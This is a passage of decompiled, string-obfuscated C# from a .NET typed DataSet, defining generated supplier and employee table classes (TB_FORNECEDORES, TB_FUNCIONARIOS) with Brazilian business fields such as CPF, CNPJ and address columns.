				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(3578)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_FORNECEDORESDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnNOME_FORNEC;

			private DataColumn columnENDERECO;

			private DataColumn columnNOME_FANTASIA;

			private DataColumn columnBAIRRO;

			private DataColumn columnCIDADE;

			private DataColumn columnCOMPLEMENTO;

			private DataColumn columnDAT_CAD;

			private DataColumn columnTEL_FIX1;

			private DataColumn columnTEL_FIX2;

			private DataColumn columnTEL_CEL;

			private DataColumn columnFAX;

			private DataColumn columnCNPJ;

			private DataColumn columnINS;

			private DataColumn columnCPF;

			private DataColumn columnRG;

			private DataColumn columnEMISSOR;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnSIT;

			private DataColumn columnFACEBOOK;

			private DataColumn columnUF;

			private DataColumn columnEMAIL;

			private DataColumn columnREPRESENTANTE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CódigoColumn => columnCódigo;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn NOME_FORNECColumn => columnNOME_FORNEC;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn ENDERECOColumn => columnENDERECO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn NOME_FANTASIAColumn => columnNOME_FANTASIA;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn BAIRROColumn => columnBAIRRO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CIDADEColumn => columnCIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn COMPLEMENTOColumn => columnCOMPLEMENTO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DAT_CADColumn => columnDAT_CAD;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_FIX1Column => columnTEL_FIX1;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_FIX2Column => columnTEL_FIX2;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn TEL_CELColumn => columnTEL_CEL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FAXColumn => columnFAX;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CNPJColumn => columnCNPJ;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn INSColumn => columnINS;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CPFColumn => columnCPF;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn RGColumn => columnRG;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn EMISSORColumn => columnEMISSOR;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SITColumn => columnSIT;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn FACEBOOKColumn => columnFACEBOOK;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn UFColumn => columnUF;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn EMAILColumn => columnEMAIL;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn REPRESENTANTEColumn => columnREPRESENTANTE;

			[DebuggerNonUserCode]
			[Browsable(false)]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FORNECEDORESRow this[int index] => (TB_FORNECEDORESRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FORNECEDORESRowChangeEventHandler TB_FORNECEDORESRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FORNECEDORESRowChangeEventHandler TB_FORNECEDORESRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FORNECEDORESRowChangeEventHandler TB_FORNECEDORESRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FORNECEDORESRowChangeEventHandler TB_FORNECEDORESRowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FORNECEDORESDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1402);
				BeginInit();
				InitClass();
				EndInit();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_FORNECEDORESDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected TB_FORNECEDORESDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_FORNECEDORESRow(TB_FORNECEDORESRow row)
			{
				base.Rows.Add(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FORNECEDORESRow AddTB_FORNECEDORESRow(string NOME_FORNEC, string ENDERECO, string NOME_FANTASIA, string BAIRRO, string CIDADE, string COMPLEMENTO, DateTime DAT_CAD, double TEL_FIX1, double TEL_FIX2, double TEL_CEL, double FAX, double CNPJ, double INS, double CPF, double RG, string EMISSOR, string OBSERVACAO, string SIT, string FACEBOOK, string UF, string EMAIL, string REPRESENTANTE)
			{
				TB_FORNECEDORESRow tB_FORNECEDORESRow = (TB_FORNECEDORESRow)NewRow();
				object[] itemArray = new object[23]
				{
					null, NOME_FORNEC, ENDERECO, NOME_FANTASIA, BAIRRO, CIDADE, COMPLEMENTO, DAT_CAD, TEL_FIX1, TEL_FIX2,
					TEL_CEL, FAX, CNPJ, INS, CPF, RG, EMISSOR, OBSERVACAO, SIT, FACEBOOK,
					UF, EMAIL, REPRESENTANTE
				};
				tB_FORNECEDORESRow.ItemArray = itemArray;
				base.Rows.Add(tB_FORNECEDORESRow);
				return tB_FORNECEDORESRow;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FORNECEDORESRow FindByCódigo(int Código)
			{
				return (TB_FORNECEDORESRow)base.Rows.Find(new object[1] { Código });
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public override DataTable Clone()
			{
				TB_FORNECEDORESDataTable tB_FORNECEDORESDataTable = (TB_FORNECEDORESDataTable)base.Clone();
				tB_FORNECEDORESDataTable.InitVars();
				return tB_FORNECEDORESDataTable;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataTable CreateInstance()
			{
				return new TB_FORNECEDORESDataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnNOME_FORNEC = base.Columns[\u0004.\u0001.\u0001(3632)];
				columnENDERECO = base.Columns[\u0004.\u0001.\u0001(2344)];
				columnNOME_FANTASIA = base.Columns[\u0004.\u0001.\u0001(3658)];
				columnBAIRRO = base.Columns[\u0004.\u0001.\u0001(2614)];
				columnCIDADE = base.Columns[\u0004.\u0001.\u0001(2364)];
				columnCOMPLEMENTO = base.Columns[\u0004.\u0001.\u0001(2434)];
				columnDAT_CAD = base.Columns[\u0004.\u0001.\u0001(2480)];
				columnTEL_FIX1 = base.Columns[\u0004.\u0001.\u0001(3688)];
				columnTEL_FIX2 = base.Columns[\u0004.\u0001.\u0001(3708)];
				columnTEL_CEL = base.Columns[\u0004.\u0001.\u0001(2398)];
				columnFAX = base.Columns[\u0004.\u0001.\u0001(3728)];
				columnCNPJ = base.Columns[\u0004.\u0001.\u0001(2550)];
				columnINS = base.Columns[\u0004.\u0001.\u0001(2562)];
				columnCPF = base.Columns[\u0004.\u0001.\u0001(2572)];
				columnRG = base.Columns[\u0004.\u0001.\u0001(2582)];
				columnEMISSOR = base.Columns[\u0004.\u0001.\u0001(3738)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnSIT = base.Columns[\u0004.\u0001.\u0001(3756)];
				columnFACEBOOK = base.Columns[\u0004.\u0001.\u0001(2512)];
				columnUF = base.Columns[\u0004.\u0001.\u0001(2380)];
				columnEMAIL = base.Columns[\u0004.\u0001.\u0001(2498)];
				columnREPRESENTANTE = base.Columns[\u0004.\u0001.\u0001(3766)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnNOME_FORNEC = new DataColumn(\u0004.\u0001.\u0001(3632), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_FORNEC);
				columnENDERECO = new DataColumn(\u0004.\u0001.\u0001(2344), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnENDERECO);
				columnNOME_FANTASIA = new DataColumn(\u0004.\u0001.\u0001(3658), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME_FANTASIA);
				columnBAIRRO = new DataColumn(\u0004.\u0001.\u0001(2614), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnBAIRRO);
				columnCIDADE = new DataColumn(\u0004.\u0001.\u0001(2364), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCIDADE);
				columnCOMPLEMENTO = new DataColumn(\u0004.\u0001.\u0001(2434), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCOMPLEMENTO);
				columnDAT_CAD = new DataColumn(\u0004.\u0001.\u0001(2480), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDAT_CAD);
				columnTEL_FIX1 = new DataColumn(\u0004.\u0001.\u0001(3688), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnTEL_FIX1);
				columnTEL_FIX2 = new DataColumn(\u0004.\u0001.\u0001(3708), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnTEL_FIX2);
				columnTEL_CEL = new DataColumn(\u0004.\u0001.\u0001(2398), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnTEL_CEL);
				columnFAX = new DataColumn(\u0004.\u0001.\u0001(3728), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnFAX);
				columnCNPJ = new DataColumn(\u0004.\u0001.\u0001(2550), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCNPJ);
				columnINS = new DataColumn(\u0004.\u0001.\u0001(2562), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnINS);
				columnCPF = new DataColumn(\u0004.\u0001.\u0001(2572), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnCPF);
				columnRG = new DataColumn(\u0004.\u0001.\u0001(2582), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnRG);
				columnEMISSOR = new DataColumn(\u0004.\u0001.\u0001(3738), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMISSOR);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnSIT = new DataColumn(\u0004.\u0001.\u0001(3756), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSIT);
				columnFACEBOOK = new DataColumn(\u0004.\u0001.\u0001(2512), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnFACEBOOK);
				columnUF = new DataColumn(\u0004.\u0001.\u0001(2380), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnUF);
				columnEMAIL = new DataColumn(\u0004.\u0001.\u0001(2498), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnEMAIL);
				columnREPRESENTANTE = new DataColumn(\u0004.\u0001.\u0001(3766), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnREPRESENTANTE);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnNOME_FORNEC.MaxLength = 50;
				columnENDERECO.MaxLength = 30;
				columnNOME_FANTASIA.MaxLength = 25;
				columnBAIRRO.MaxLength = 30;
				columnCIDADE.MaxLength = 40;
				columnCOMPLEMENTO.MaxLength = 30;
				columnEMISSOR.MaxLength = 3;
				columnOBSERVACAO.MaxLength = 150;
				columnSIT.MaxLength = 50;
				columnFACEBOOK.MaxLength = 50;
				columnUF.MaxLength = 2;
				columnEMAIL.MaxLength = 50;
				columnREPRESENTANTE.MaxLength = 30;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FORNECEDORESRow NewTB_FORNECEDORESRow()
			{
				return (TB_FORNECEDORESRow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_FORNECEDORESRow(builder);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override Type GetRowType()
			{
				return typeof(TB_FORNECEDORESRow);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void RemoveTB_FORNECEDORESRow(TB_FORNECEDORESRow row)
			{
				base.Rows.Remove(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(3796)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_FUNCIONARIOSDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnNOME_FUNCIONARIO;

			private DataColumn columnTIPO_FUNCIONARIO;

			private DataColumn columnAPELIDO;

			private DataColumn columnENDERECO;

			private DataColumn columnBAIRRO;

			private DataColumn columnCIDADE;

			private DataColumn columnUF;

			private DataColumn columnCEP;

			private DataColumn columnTEL_CEL;

			private DataColumn columnTEL_RES;

			private DataColumn columnCOMPLEMENTO;

			private DataColumn columnDAT_NASC;

			private DataColumn columnDAT_ADMISAO;

			private DataColumn columnEMAIL;

			private DataColumn columnFACEBOOK;

			private DataColumn columnCPF;

			private DataColumn columnRG;

			private DataColumn columnCNPJ;

			private DataColumn columnINS;

			private DataColumn columnEMISSOR;

			private DataColumn columnCOMISAO;

			private DataColumn columnOBSERVACAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CódigoColumn => columnCódigo;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn NOME_FUNCIONARIOColumn => columnNOME_FUNCIONARIO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn TIPO_FUNCIONARIOColumn => columnTIPO_FUNCIONARIO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn APELIDOColumn => columnAPELIDO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn ENDERECOColumn => columnENDERECO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn BAIRROColumn => columnBAIRRO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CIDADEColumn => columnCIDADE;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn UFColumn => columnUF;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CEPColumn => columnCEP;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_CELColumn => columnTEL_CEL;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn TEL_RESColumn => columnTEL_RES;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn COMPLEMENTOColumn => columnCOMPLEMENTO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DAT_NASCColumn => columnDAT_NASC;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DAT_ADMISAOColumn => columnDAT_ADMISAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn EMAILColumn => columnEMAIL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn FACEBOOKColumn => columnFACEBOOK;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CPFColumn => columnCPF;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn RGColumn => columnRG;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CNPJColumn => columnCNPJ;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn INSColumn => columnINS;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn EMISSORColumn => columnEMISSOR;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn COMISAOColumn => columnCOMISAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			[Browsable(false)]
			public int Count => base.Rows.Count;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FUNCIONARIOSRow this[int index] => (TB_FUNCIONARIOSRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FUNCIONARIOSRowChangeEventHandler TB_FUNCIONARIOSRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FUNCIONARIOSRowChangeEventHandler TB_FUNCIONARIOSRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FUNCIONARIOSRowChangeEventHandler TB_FUNCIONARIOSRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_FUNCIONARIOSRowChangeEventHandler TB_FUNCIONARIOSRowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_FUNCIONARIOSDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1436);
				BeginInit();
				InitClass();
				EndInit();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_FUNCIONARIOSDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_FUNCIONARIOSDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void AddTB_FUNCIONARIOSRow(TB_FUNCIONARIOSRow row)
			{
				base.Rows.Add(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_FUNCIONARIOSRow AddTB_FUNCIONARIOSRow(string NOME_FUNCIONARIO, string TIPO_FUNCIONARIO, string APELIDO, string ENDERECO, string BAIRRO, string CIDADE, string UF, double CEP, double TEL_CEL, double TEL_RES, string COMPLEMENTO, DateTime DAT_NASC, DateTime DAT_ADMISAO, string EMAIL, string FACEBOOK, double CPF, double RG, double CNPJ, double INS, string EMISSOR, double COMISAO, string OBSERVACAO)
			{
				TB_FUNCIONARIOSRow tB_FUNCIONARIOSRow = (TB_FUNCIONARIOSRow)NewRow();
				object[] itemArray = new object[23]
				{
